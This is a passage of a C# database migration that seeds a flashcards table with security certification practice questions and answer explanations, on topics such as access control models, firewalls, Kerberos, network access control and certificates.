                values: new object[] { 558, "\r\n152. A. Restricting each faculty account so that it is only usable\r\nwhen that particular faculty member is typically on campus will\r\nprevent someone from logging in with that account after hours,\r\neven if they have the password. Usage auditing may detect\r\nmisuse of accounts but will not prevent it. Longer passwords are\r\neffective security, but a longer password can still be stolen.\r\nCredential management is always a good idea, but it won’t\r\naddress this specific issue.\r\n", 3, "\r\n152. Stefan just became the new security officer for a university. He is concerned that student\r\nworkers who work late on campus could try to log in with faculty credentials. Which of the\r\nfollowing would be most effective in preventing this?\r\nA. Time-of-day restrictions\r\nB. Usage auditing\r\nC. Password length\r\nD. Credential management\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 559, "\r\n153. D. Although next-generation firewalls provide may defensive\r\ncapabilities, SQL injection is an attack instead of a defense. In\r\naddition to geolocation, intrusion detection system (IDS) and\r\nintrusion prevention system (IPS), and sandboxing capabilities,\r\nmany next-generation firewalls include web application\r\nfirewalls, load balancing, IP reputation and URL filtering, and\r\nantimalware and antivirus features.\r\n", 3, "\r\n153. Next-generation firewalls include many cutting-edge features. Which of the following is not\r\na common next-generation firewall capability?\r\nA. Geolocation\r\nB. IPS and/or IDS\r\nC. Sandboxing\r\nD. SQL injection\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 560, "\r\n154. C. Enabling storm control on a switch will limit the amount of\r\ntotal bandwidth that broadcast packets can use, preventing\r\nbroadcast storms from taking down the network. Blocking\r\nAddress Resolution Protocol (ARP) would prevent systems from\r\nfinding each other, and blocking all broadcast packets would\r\nalso block many important network features.\r\n", 3, "\r\n154. Greg knows that when a switch doesn’t know where a node is, it will send out a broadcast\r\nto attempt to find it. If other switches inside its broadcast domain do not know about the\r\nnode, they will also broadcast that query, and this can create a massive amount of traffic\r\nthat can quickly amplify out of control. He wants to prevent this scenario without causing\r\nthe network to be unable to function. What port-level security feature can he enable to\r\nprevent this?\r\nA. Use ARP blocking.\r\nB. Block all broadcast packets.\r\nC. Enable storm control.\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 561, "\r\n155. B. Demilitarized zones (DMZs) remain a useful concept when\r\ndesigning cloud environments, although the technical\r\nimplementation may vary, since cloud providers may have\r\nsecure web services, load-balancing capabilities or other features\r\nthat make DMZs look different. Proxy servers are useful for\r\ncontrolling, filtering, and relaying traffic, but they do not\r\nprovide the full segmentation that Isaac is looking for. A VPC is\r\na virtual datacenter and will typically contain his infrastructure\r\nbut does not specifically address these needs.\r\n", 3, "\r\n155. Isaac is designing his cloud datacenter’s public-facing network and wants to properly implement\r\nsegmentation to protect his application servers while allowing his web servers to be\r\naccessed by customers. What design concept should he apply to implement this type of\r\nsecure environment?\r\nA. A reverse proxy server\r\nB. A DMZ\r\nC. A forward proxy server\r\nD. A VPC\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 562, "\r\n156. A. A permissions audit will find what permissions each user has\r\nand compare that to their job requirements. Permission audits\r\nshould be conducted periodically. Job rotation, though\r\nbeneficial for other security reasons, will actually exacerbate this\r\nproblem. It is impractical to forbid anyone from ever changing\r\njob roles, and separation of duties would have no impact on this\r\nissue.\r\n", 3, "\r\n156. Jennifer is concerned that some people in her company have more privileges than they\r\nshould. This has occurred due to people moving from one position to another and having\r\ncumulative rights that exceed the requirements of their current jobs. Which of the following\r\nwould be most effective in mitigating this issue?\r\nA. Permission auditing\r\nB. Job rotation\r\nC. Preventing job rotation\r\nD. Separation of duties\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 551, "\r\n145. D. Rule-based access control applies a set of rules to an access\r\nrequest. Based on the application of the rules, the user may be\r\ngiven access to a specific resource that they were not explicitly\r\ngranted permission to. MAC, DAC, and role-based access control\r\nwouldn’t give a user access unless that user has already been\r\nexplicitly given that access.\r\n", 3, "\r\n145. Frank is a security administrator for a large company. Occasionally, a user needs to access\r\na specific resource that they don’t have permission to access. Which access control methodology\r\nwould be most helpful in this situation?\r\nA. Mandatory access control (MAC)\r\nB. Discretionary access control (DAC)\r\nC. Role-based access control\r\nD. Rule-based access control\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 537, "\r\n131. D. Jump boxes are a common solution for providing access to a\r\nnetwork with a different security profile. In this case, Ed can\r\ndeploy a jump box in the demilitarized zone (DMZ) to allow\r\nusers within his administrative zone to perform tasks without\r\ndirectly connecting to the world-exposed DMZ. This helps keep\r\nadministrative systems secure and allows him to focus on the\r\nsecurity of the jump box, while also making it easier to monitor\r\nand maintain. An intrusion prevention system (IPS) is used to\r\nmonitor and block unwanted traffic, but isn’t used for remote\r\naccess. A NAT gateway performs network address translation\r\nand is placed between networks but is not typically used to\r\nprovide secure connections between networks. Instead, it serves\r\nto reduce the number of public IP addresses used and to provide\r\nsome limited security for systems behind it. Routers are used to\r\nconnect to networks but are not used to provide secure access as\r\ndescribed in the question.\r\n", 3, "\r\n131. Ed needs to securely connect to a DMZ from an administrative network using Secure Shell\r\n(SSH). What type of system is frequently deployed to allow this to be done securely across\r\nsecurity boundaries for network segments with different security levels?\r\nA. An IPS\r\nB. A NAT gateway\r\nC. A router\r\nD. A jump box\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 536, "\r\n130. C. The cost of applications and the quality of the security\r\nimplementation can vary based on the vendor and product, but\r\ncloud-native security solutions will generally have better and\r\ndeeper integration into the cloud platform than third-party\r\nsolutions will. Vendor diversity in designs may still drive other\r\nchoices, but those are conscious design decisions.\r\n", 3, "\r\n130. What is the primary advantage of cloud-native security solutions when compared to thirdparty\r\nsolutions deployed to the same cloud environment?\r\nA. Lower cost\r\nB. Better security\r\nC. Tighter integration\r\nD. All of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 535, "\r\n129. D. Wi-Fi 5 networks can provide theoretical throughput up to\r\n3.5 Gbps megabits per second, although newer standards like\r\nWi-Fi 6 continue to push this higher. The next fastest wireless\r\nstandard listed is LTE cellular with theoretical throughputs\r\naround 50 megabits per second. When bandwidth is important,\r\nWi-Fi will tend to win, although 5G cellular networks under\r\nideal conditions may rival Wi-Fi.\r\n", 3, "\r\n129. Mark wants to provide a wireless connection with the highest possible amount of bandwidth.\r\nWhich of the following should he select?\r\nA. LTE cellular\r\nB. Bluetooth\r\nC. NFC\r\nD. 802.11ac Wi-Fi\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 510, "\r\n104. B. Endpoint detection and response (EDR) focuses on\r\nidentifying anomalies and issues, but it is not designed to be a\r\nmalware analysis tool. Instead, the ability to search and explore\r\ndata, identify suspicious activities, and coordinate responses is\r\nwhat makes up an EDR tool.\r\n", 3, "\r\n104. Endpoint detection and response has three major components that make up its ability to\r\nprovide visibility into endpoints. Which of the following is not one of those three parts?\r\nA. Data search\r\nB. Malware analysis\r\nC. Data exploration\r\nD. Suspicious activity detection\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 511, "\r\n105. A. A web proxy can be used to block certain websites. It is\r\ncommon practice for network administrators to block either\r\nindividual sites or general classes of sites (like job-hunting\r\nsites). Network address translation (NAT) is used to translate\r\nthe private IP addresses of internal computers to public IP\r\naddresses. A packet filter firewall can block traffic on a given\r\nport or IP address or using a particular protocol, but generally\r\nthey are not able to block specific websites. Network-based\r\nintrusion prevention systems (NIPSs) identify and block attacks;\r\nthey cannot prevent users from visiting specific websites.\r\n", 3, "\r\n105. Isabelle is responsible for security at a mid-sized company. She wants to prevent users on her\r\nnetwork from visiting job-hunting sites while at work. Which of the following would be the\r\nbest device to accomplish this goal?\r\nA. Proxy server\r\nB. NAT\r\nC. A packet filter firewall\r\nD. NIPS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 512, "\r\n106. C. Secrets management services provide the ability to store\r\nsensitive data like application programming interface (API)\r\nkeys, passwords, and certificates. They also provide the ability to\r\nmanage, retrieve, and audit those secrets. A public key\r\ninfrastructure (PKI) would focus on certificates and encryption\r\nkeys, without passwords or API keys. A Trusted Platform\r\nModule (TPM) is associated with hardware, and a hush service\r\nwas made up for this question.\r\n", 3, "\r\n106. What term describes a cloud system that stores, manages, and allows auditing of API keys,\r\npasswords, and certificates?\r\nA. A cloud PKI\r\nB. A cloud TPM\r\nC. A secrets manager\r\nD. A hush service\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 513, "\r\n107. A. SAML, the Security Assertion Markup Language, is used by\r\nmany identity providers to exchange authorization and\r\nauthentication data with service providers. Kerberos and LDAP\r\n(Lightweight Directory Access Protocol) are used inside many\r\norganizations, but Fred will find more success with SAML for\r\npopular web services. New Technology LAN Manager (NTLM)\r\nremains in use for Windows systems, but Kerberos is more\r\ncommonly used for modern Windows domains and would not be\r\nused in the scenario described here.\r\n", 3, "\r\n107. Fred is building a web application that will receive information from a service provider.\r\nWhat open standard should he design his application to use to work with many modern\r\nthird-party identity providers?\r\nA. SAML\r\nB. Kerberos\r\nC. LDAP\r\nD. NTLM\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 514, "\r\n108. D. Load balancing the cluster will prevent any single server\r\nfrom being overloaded. And if a given server is offline, other\r\nservers can take on its workload. Option A is incorrect. A VPN\r\nconcentrator, as the name suggests, is used to initiate virtual\r\nprivate networks (VPNs). Option B is incorrect. Aggregate\r\nswitching can shunt more bandwidth to the servers but won’t\r\nmitigate the threat of one or more servers being offline. Option\r\nC is incorrect. SSL accelerators are a method of offloading\r\nprocessor-intensive public-key encryption for Transport Layer\r\nSecurity (TLS) and Secure Sockets Layer (SSL) to a hardware\r\naccelerator.\r\n", 3, "\r\n108. You are responsible for an e-commerce site. The site is hosted in a cluster. Which of the following\r\ntechniques would be best in assuring availability?\r\nA. A VPN concentrator\r\nB. Aggregate switching\r\nC. An SSL accelerator\r\nD. Load balancing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 515, "\r\n109. C. The three channels that do not overlap are 1, 6, and 11. The\r\nrest of the channels will overlap. In an ideal installation, these\r\nthree channels can be used to maximize throughput and\r\nminimize interference.\r\n", 3, "\r\n109. What channels do not cause issues with channel overlap or overlap in U.S. installations of\r\n2.4 GHz Wi-Fi networks?\r\nA. 1, 3, 5, 7, 9, and 11\r\nB. 2, 6, and 10\r\nC. 1, 6, and 11\r\nD. Wi-Fi channels do not suffer from channel overlap.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 516, "\r\n110. B. The correct answer is to encrypt all the web traffic to this\r\napplication using Transport Layer Security (TLS). This is one of\r\nthe most fundamental security steps to take with any website. A\r\nweb application firewall (WAF) is probably a good idea, but it is\r\nnot the most important thing for Ryan to implement. While a\r\nnetwork-based intrusion prevention system (IPS) or intrusion\r\ndetection system (IDS) may be a good idea, those should be\r\nconsidered after TLS is configured.\r\n", 3, "\r\n110. Ryan is concerned about the security of his company’s web application. Since the application\r\nprocesses confidential data, he is most concerned about data exposure. Which of the\r\nfollowing would be the most important for him to implement?\r\nA. WAF\r\nB. TLS\r\nC. NIPS\r\nD. NIDS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 517, "\r\n111. B. Infrared (IR) is the only line-of-sight method on the list.\r\nAlthough Near-Field Communication (NFC) and Bluetooth have\r\na relatively short range, they can still operate through materials\r\nplaced between them and the receiver, and Wi-Fi can do so at an\r\neven longer range.\r\n", 3, "\r\n111. Which of the following connection methods only works via a line-of-sight connection?\r\nA. Bluetooth\r\nB. Infrared\r\nC. NFC\r\nD. Wi-Fi\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 518, "\r\n112. A. The correct answer is that Kerberos uses various tickets,\r\neach with a time limit. The service tickets are typically only good\r\nfor 5 minutes or less. This means that if the Network Time\r\nProtocol (NTP) is failing, valid tickets may appear to be expired.\r\nRADIUS, CHAP, and LDAP will not have any significant effect\r\ndue to NTP failure.\r\n", 3, "\r\n112. Carole is responsible for various network protocols at her company. The Network Time\r\nProtocol has been intermittently failing. Which of the following would be most affected?\r\nA. Kerberos\r\nB. RADIUS\r\nC. CHAP\r\nD. LDAP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 519, "\r\n113. C. The correct answer is that Challenge Handshake\r\nAuthentication Protocol (CHAP) periodically has the client\r\nreauthenticate. This is transparent to the user but is done\r\nspecifically to prevent session hijacking. Password\r\nAuthentication Protocol (PAP) is actually quite old and does not\r\nreauthenticate. In fact, it even sends the password in cleartext,\r\nso it should not be used any longer. SPAP (Shiva Password\r\nAuthentication Protocol) adds password encryption to PAP but\r\ndoes not reauthenticate. OAuth is used in web authentication\r\nand does not reauthenticate.\r\n", 3, "\r\n113. You are selecting an authentication method for your company’s servers. You are looking for\r\na method that periodically reauthenticates clients to prevent session hijacking. Which of the\r\nfollowing would be your best choice?\r\nA. PAP\r\nB. SPAP\r\nC. CHAP\r\nD. OAuth\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 520, "\r\n114. B. A software firewall is best suited to deployments to\r\nindividual machines, particularly when endpoint systems are\r\nbeing protected. Hardware firewalls are typically deployed to\r\nprotect network segments or groups of systems, and result in\r\nadditional expense and management. Virtual and cloud firewalls\r\nare most often deployed in datacenters where virtual or cloud\r\nenvironments are in use, although a virtual firewall could be run\r\non an endpoint.\r\n", 3, "\r\n114. Naomi wants to deploy a firewall that will protect her endpoint systems from other systems\r\nin the same security zone of her network as part of a zero-trust design. What type of firewall\r\nis best suited to this type of deployment?\r\nA. Hardware firewalls\r\nB. Software firewalls\r\nC. Virtual firewalls\r\nD. Cloud firewalls\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 521, "\r\n115. D. A service account is the most appropriate in this scenario.\r\nService accounts are given the least privileges the service needs\r\nand are used by the service, without the need for a human user.\r\nAlthough you could assign a user account, it is not as good a\r\nsolution as using a service account. A guest account would never\r\nbe a good idea for a service. Guest accounts are typically too\r\nlimited. It’s common practice to disable default accounts such as\r\nthe Guest account. An admin account would give too many\r\nprivileges to the service and violate the principle of least\r\nprivileges.\r\n", 3, "\r\n115. Lisa is setting up accounts for her company. She wants to set up accounts for the Oracle\r\ndatabase server. Which of the following would be the best type of account to assign to the\r\ndatabase service?\r\nA. User\r\nB. Guest\r\nC. Admin\r\nD. Service\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 522, "\r\n116. A. Of these versions of Extensible Authentication Protocol\r\n(EAP), only Lightweight Extensible Authentication Protocol\r\n(LEAP) does not support TLS. EAP Tunneled Transport Layer\r\nSecurity (EAP-TTLS) actually extends TLS, but supports the\r\nunderlying protocol. Protected Extensible Authentication\r\nProtocol (PEAP) encapsulates EAP within an encrypted TLS\r\ntunnel.\r\n", 3, "\r\n116. Gary wants to implement EAP-based protocols for his wireless authentication and wants to\r\nensure that he uses only versions that support Transport Layer Security (TLS). Which of the\r\nfollowing EAP-based protocols does not support TLS?\r\nA. LEAP\r\nB. EAP-TTLS\r\nC. PEAP\r\nD. EAP-TLS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 523, "\r\n117. C. Jailbreaking allows users to add software to an iPhone that\r\nisn’t normally allowed, including third-party applications,\r\nchanging system settings, themes, or default applications. Thirdparty\r\napplication stores aren’t available by default, and sideloading\r\ncan be accomplished in iOS but doesn’t do what Manny\r\nwants it to, and of course installing Android won’t let Manny\r\nchange iOS settings. If Manny does jailbreak his phone, his\r\norganization may notice if they’re using a mobile device\r\nmanagement (MDM) or unified endpoint management (UEM)\r\napplication to track the status of the device.\r\n", 3, "\r\n117. Manny wants to download apps that aren’t in the iOS App Store, as well as change settings\r\nat the OS level that Apple does not normally allow to be changed. What would he need to\r\ndo to his iPhone to allow this?\r\nA. Buy an app via a third-party app store.\r\nB. Install an app via side-loading.\r\nC. Jailbreak the phone.\r\nD. Install Android on the phone.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 524, "\r\n118. C. Many smartcards implement Radio Frequency Identification\r\n(RFID) to allow them to be used for entry access and other\r\npurposes. Wi-Fi, Infrared, and Bluetooth generally require\r\npowered circuits to interact with systems, making them a poor\r\nfit for a smartcard that does not typically have a battery or other\r\npower source.\r\n", 3, "\r\n118. Many smartcards implement a wireless technology to allow them to be used without a card\r\nreader. What wireless technology is frequently used to allow the use of smartcards for entryaccess\r\nreaders and similar access controls?\r\nA. Infrared\r\nB. Wi-Fi\r\nC. RFID\r\nD. Bluetooth\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 525, "\r\n119. A. Mandatory access control (MAC) is the correct solution. It\r\nwill not allow lower privileged users to even see the data at a\r\nhigher privilege level. Discretionary access control (DAC) has\r\neach data owner configure his or her own security. Role-based\r\naccess control (RBAC) could be configured to meet the needs,\r\nbut it’s not the best solution for these requirements. Security\r\nAssertion Markup Language (SAML) is not an access control\r\nmodel.\r\n", 3, "\r\n119. Carl has been asked to set up access control for a server. The requirements state that users\r\nat a lower privilege level should not be able to see or access files or data at a higher privilege\r\nlevel. What access control model would best fit these requirements?\r\nA. MAC\r\nB. DAC\r\nC. RBAC\r\nD. SAML\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 526, "\r\n120. B. An agent-based, preadmission system will provide greater\r\ninsight into the configuration of the system using the agent, and\r\nusing a preadmission model will allow the system configuration\r\nto be tested before the system is allowed to connect to the\r\nnetwork. Agentless NAC uses scanning and/or network\r\ninventory techniques and will typically not have as deep a level\r\nof insight into the configuration and software versions running\r\non a system. Postadmission systems make enforcement\r\ndecisions based on what users do after they gain admission to a\r\nnetwork, rather than prior to gaining admission, allowing you to\r\nquickly rule out two of these options.\r\n", 3, "\r\n120. Jack wants to deploy a network access control (NAC) system that will stop systems that are\r\nnot fully patched from connecting to his network. If he wants to have full details of system\r\nconfiguration, antivirus version, and patch level, what type of NAC deployment is most\r\nlikely to meet his needs?\r\nA. Agentless, preadmission\r\nB. Agent-based, preadmission\r\nC. Agentless, postadmission\r\nD. Agent-based, postadmission\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 527, "\r\n121. C. Claire’s best option is to deploy a detection and fix via her\r\nweb application firewall (WAF) that will detect the SQL injection\r\nattempt and prevent it. An intrusion detection system (IDS) only\r\ndetects attacks and cannot stop them. Manually updating the\r\napplication code after reverse-engineering it will take time, and\r\nshe may not even have the source code or the ability to modify it.\r\nFinally, vendor patches for zero days typically take some time to\r\ncome out even in the best of circumstances, meaning that Claire\r\ncould be waiting on a patch for quite a while if that is the option\r\nshe chooses.\r\n", 3, "\r\n121. Claire has been notified of a zero-day flaw in a web application. She has the exploit code,\r\nincluding a SQL injection attack that is being actively exploited. How can she quickly react\r\nto prevent this issue from impacting her environment if she needs the application to continue\r\nto function?\r\nA. Deploy a detection rule to her IDS.\r\nB. Manually update the application code after reverse-engineering it.\r\nC. Deploy a fix via her WAF.\r\nD. Install the vendor provided patch.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 528, "\r\n122. C. CYOD, or choose your own device, allows users to choose a\r\ndevice that is corporate owned and paid for. Choices may be\r\nlimited to set of devices, or users may be allowed to choose\r\nessentially any device depending on the organization’s\r\ndeployment decisions. BYOD allows users to bring their own\r\ndevice, whereas COPE, or corporate-owned, personally enabled,\r\nprovides devices to users that they can then use for personal use.\r\nVDI uses a virtual desktop infrastructure as an access layer for\r\nany security model where specialized needs or security\r\nrequirements may require access to remote desktop or\r\napplication services.\r\n", 3, "\r\n122. Eric wants to provide company-purchased devices, but his organization prefers to provide\r\nend users with choices among devices that can be managed and maintained centrally. What\r\nmobile device deployment model best fits this need?\r\nA. BYOD\r\nB. COPE\r\nC. CYOD\r\nD. VDI\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 529, "\r\n123. B. The key element here is that the certificate authorities (CA)\r\nare operating in a mesh, meaning no CA is the root CA and that\r\neach must trust the others. To accomplish this, Derek first needs\r\nto issue certificates from D to each of the other Cas and then\r\nhave the others issue D a certificate. Private keys should never\r\nbe exchanged, and of course if he only has the other systems\r\nissue D certificates, they won’t recognize his server.\r\n", 3, "\r\n123. Derek is in charge of his organization’s certificate authorities and wants to add a new certificate\r\nauthority. His organization already has three certificate authorities operating in a mesh:\r\nA. South American CA, B. the United States CA, and C, the European Union CA. As they\r\nexpand into Australia, he wants to add D. the Australian CA. Which CAs will Derek need\r\nto issue certificates to from D. to ensure that systems in the Australian domain are able to\r\naccess servers in A, B, and C’s domains?\r\nA. He needs all the other systems to issue D certificates so that his systems will be\r\ntrusted there.\r\nB. He needs to issue certificates from D to each of the other CAs systems and then have\r\nthe other CAs issue D a certificate.\r\nC. He needs to provide the private key from D to each of the other CAs.\r\nD. He needs to receive the private key from each of the other CAs and use it to sign the\r\nroot certificate for D.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 530, "\r\n124. C. If Claire is using Simple Network Management Protocol\r\n(SNMP) to manage and monitor her network devices, she should\r\nmake sure she is using SNMPv3 and that it is properly\r\nconfigured. SNMPv3 can provide information about the status\r\nand configuration of her network devices. Remote\r\nAuthentication Dial-In User Service (RADIUS) might be used to\r\nauthenticate to the network, but Transport Layer Security (TLS)\r\nand SSH File Transfer Protocol (SFTP) are not specifically used\r\nfor the purposes described.\r\n", 3, "\r\n124. Claire is concerned about an attacker getting information regarding network devices and\r\ntheir configuration in her company. Which protocol should she implement that would be\r\nmost helpful in mitigating this risk while providing management and reporting about network\r\ndevices?\r\nA. RADIUS\r\nB. TLS\r\nC. SNMPv3\r\nD. SFTP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 531, "\r\n125. D. Fuzzers send unexpected and out of range data to\r\napplications to see how they will respond. In this case, Ben is\r\nusing a fuzzer. Web proxies are often used to do application\r\ntesting because they allow data to be changed between the\r\nbrowser and the application. SQL injection may be done via a\r\nweb proxy, but a dedicated SQL injection proxy is not a type of\r\ntool by itself. Finally, a static code review tool is used to review\r\nsource code and may be as simple as a Notepad application or as\r\ncomplex as a fully integrated development environment (IDE).\r\n", 3, "\r\n125. Ben is using a tool that is specifically designed to send unexpected data to a web application\r\nthat he is testing. The application is running in a test environment, and configured to log\r\nevents and changes. What type of tool is Ben using?\r\nA. A SQL injection proxy\r\nB. A static code review tool\r\nC. A web proxy\r\nD. A fuzzer\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 532, "\r\n126. B. Containerization will allow Eric’s company’s tools and data\r\nto be run inside of an application-based container, isolating the\r\ndata and programs from the self-controlled bring your own\r\ndevice (BYOD) devices. Storage segmentation can be helpful, but\r\nthe operating system itself as well as the applications would\r\nremain a concern. Eric should recommend full-device\r\nencryption (FDE) as a security best practice, but encrypting the\r\ncontainer and the data it contains can provide a reasonable\r\nsecurity layer even if the device itself is not fully encrypted.\r\nRemote wipe is helpful if devices are lost or stolen, but the end\r\nuser may not be okay with having the entire device wiped, and\r\nthere are ways to work around remote wipes, including blocking\r\ncellular and Wi-Fi signals.\r\n", 3, "\r\n126. Eric is responsible for his organization’s mobile device security. They use a modern mobile\r\ndevice management (MDM) tool to manage a BYOD mobile device environment. Eric needs\r\nto ensure that the applications and data that his organization provides to users of those\r\nmobile devices remain as secure as possible. Which of the following technologies will\r\nprovide him with the best security?\r\nA. Storage segmentation\r\nB. Containerization\r\nC. Full-device encryption\r\nD. Remote wipe\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 533, "\r\n127. B. Kerberos does not send the users password across the\r\nnetwork. When the user’s name is sent to the authentication\r\nservice, the service retrieves the hash of the user’s password\r\nfrom the database, and then uses that as a key to encrypt data to\r\nbe sent back to the user. The user’s machine takes the password\r\nthat the user entered, hashes it, and then uses that as a key to\r\ndecrypt what was sent back by the server. Challenge Handshake\r\nAuthentication Protocol (CHAP) sends the user’s password in an\r\nencrypted form. RBAC is an access control model, not an\r\nauthentication protocol. Type II authentication is something you\r\nhave, such as a key or card.\r\n", 3, "\r\n127. Murali is looking for an authentication protocol for his network. He is very concerned\r\nabout highly skilled attackers. As part of mitigating that concern, he wants an authentication\r\nprotocol that never actually transmits a user’s password, in any form. Which authentication\r\nprotocol would be a good fit for Murali’s needs?\r\nA. CHAP\r\nB. Kerberos\r\nC. RBAC\r\nD. Type II\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 534, "\r\n128. A. EV, or extended validation, certificates prove that the X.509\r\ncertificate has been issued to the correct legal entity. In addition,\r\nonly specific certificate authorities (Cas) can issue EV\r\ncertificates. Domain-validated certificates require proof that you\r\nhave control of the domain, such as setting the DNS TXT record\r\nor responding to an email sent to a contact in the domain’s\r\nWhois record. An organizational validation certificate requires\r\neither domain validation and additional proof that the\r\norganization is a legal entity. OCSP certificates were made up for\r\nthis question.\r\n", 3, "\r\n128. As part of the certificate issuance process from the CA that her company works with,\r\nMarie is required to prove that she is a valid representative of her company. The CA goes\r\nthrough additional steps to ensure that she is who she says she is and that her company is\r\nlegitimate, and not all CAs can issue this type of certificate. What type of certificate has she\r\nbeen issued?\r\nA. An EV certificate\r\nB. A domain-validated certificate\r\nC. An organization validation certificate\r\nD. An OCSP certificate\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 675, "\r\n43. A. Mapping networks using ping relies on pinging each host,\r\nand then uses time-to-live (TTL) information to determine how\r\nmany hops exist between known hosts and devices inside a\r\nnetwork. When TTLs decrease, another router or switch\r\ntypically exists between you and the device. Packets sent and\r\nreceived can be used to determine if there are issues with the\r\npath or link, and transit time can provide information about\r\nrelative network distance or the path used, but traceroute\r\nprovides far more useful detail in that case.\r\n", 4, "\r\n43. Ananth has been told that attackers sometimes use ping to map networks. What information\r\nreturned by ping could be most effectively used to determine network topology?\r\nA. TTL\r\nB. Packets sent\r\nC. Packets received\r\nD. Transit time\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 676, "\r\n44. C. Organizations define retention policies for different data\r\ntypes and systems. Many organizations use 30-, 45-, 90-, 180-,\r\nor 365-day retention policies, with some information required to\r\nbe kept longer due to law or compliance reasons. Susan’s\r\norganization may keep logs for as little as 30 days depending on\r\nstorage limitations and business needs. Data classification\r\npolicies typically impact how data is secured and handled.\r\nBackup policies determine how long backups are retained and\r\nrotated and may have an impact on data if the logs are backed\r\nup, but backing up logs are a less common practice due to the\r\nspace they take up versus the value of having logs backed up.\r\nLegal hold practices are common, but policies are less typically\r\ndefined for legal holds since requirements are set by law.\r\n", 4, "\r\n44. Susan has discovered evidence of a compromise that occurred approximately five months\r\nago. She wants to conduct an incident investigation but is concerned about whether the data\r\nwill exist. What policy guides how long logs and other data are kept in most organizations?\r\nA. The organization’s data classification policy\r\nB. The organization’s backup policy\r\nC. The organization’s retention policy\r\nD. The organization’s legal hold policy\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
